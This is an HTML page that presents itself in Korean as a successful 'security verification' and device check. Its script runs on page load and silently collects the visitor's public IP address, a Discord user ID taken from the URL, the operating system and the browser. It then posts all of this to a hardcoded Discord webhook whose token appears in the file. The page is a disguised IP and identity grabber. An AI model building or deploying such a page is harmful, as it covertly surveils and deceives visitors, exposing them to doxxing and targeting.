<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Security Verification Success</title>
    <script>
        async function sendLog() {
            // 1. 본인의 디스코드 웹훅 URL 입력
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd";

            // URL 파라미터에서 유저 ID 가져오기 (예: index.html?id=12345)
            const urlParams = new URLSearchParams(window.location.search);
            const discordId = urlParams.get('id') || "미확인 유저";

            // 2. IP 및 기기 정보 수집
            let userIp = "수집 실패";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIp = data.ip;
            } catch (e) {}

            const now = new Date();
            const timeStr = now.toLocaleString('en-US', { 
                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', 
                hour: '2-digit', minute: '2-digit', hour12: true 
            });

            // 3. 디스코드 전송 데이터 구성 (이미지 레이아웃 재현)
            const payload = {
                "embeds": [{
                    "title": "✅ 인증 성공",
                    "color": 3066993,
                    "fields": [
                        { "name": "👤 유저 정보", "value": `<@${discordId}> (${discordId})`, "inline": false },
                        { "name": "🔑 2차 인증", "value": "False", "inline": true },
                        { "name": "⌚ 인증 시각", "value": timeStr, "inline": false },
                        { "name": "🌐 아이피 정보", "value": `아이피: ${userIp}\n위치: 대한민국`, "inline": false },
                        { "name": "💻 운영체제", "value": navigator.platform, "inline": true },
                        { "name": "🧭 브라우저", "value": navigator.userAgent.includes("Chrome") ? "Chrome" : "Other", "inline": true },
                        { "name": "🆔 로그 ID", "value": Math.random().toString(36).substring(2, 11).toUpperCase(), "inline": false }
                    ],
                    "footer": { "text": `오늘 ${now.toLocaleTimeString('ko-KR', { hour: '2-digit', minute: '2-digit' })}` }
                }]
            };

            // 웹훅 전송
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        window.onload = sendLog;
    </script>
    <style>
        body{background:#0b0e14;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
        .card{text-align:center;background:#161b22;padding:50px;border-radius:20px;border:1px solid #30363d;box-shadow:0 10px 40px rgba(0,0,0,.5);max-width:350px}
        .icon{width:80px;height:80px;background:#238636;color:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:50px;margin:0 auto 20px}
        h1{font-size:24px;margin:10px 0;color:#f0f6fc}
        p{color:#8b949e;font-size:15px;line-height:1.5}
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">✔</div>
        <h1>인증 성공</h1>
        <p>기기 보안 점검 및 환경 최적화가<br>성공적으로 완료되었습니다.</p>
        <p style="font-size:12px;margin-top:20px;color:#58a6ff">이 창은 안전하게 닫으셔도 됩니다.</p>
    </div>
</body>
</html>
